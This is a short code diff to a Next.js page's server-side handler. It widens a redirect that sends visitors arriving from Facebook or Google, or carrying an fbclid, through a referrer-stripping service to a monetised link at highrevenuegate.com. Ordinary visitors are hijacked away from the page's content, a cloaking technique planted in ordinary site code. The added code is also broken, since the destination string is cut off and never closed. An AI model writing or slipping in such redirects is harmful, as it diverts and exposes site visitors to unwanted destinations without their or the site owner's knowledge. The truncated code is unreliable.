@@ -13,17 +13,13 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	const fbclid = ctx.query.fbclid;
 
 	// redirect if facebook is the referer or request contains fbclid
-		if (referringURL?.includes('facebook.com') || fbclid) {
+		if (referringURL?.includes('google.com') || referringURL?.includes('facebook.com') || fbclid) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `${
+                'http://nullrefer.ir/?https://www.highrevenuegate.com/b8eg9312?key=1e0d3c3bb1bf40
 
-		return {
-			redirect: {
-				permanent: false,
-				destination: `${
-					`http://nullrefer.ir/?https://www.highrevenuegate.com/b8eg9312?key=1e0d3c3bb1bf40d38accb9ce3cdbf0f6/`
-				}`,
-			},
-		};
-		}
 	const query = gql`
 		{
 			post(id: "/${path}/", idType: URI) {
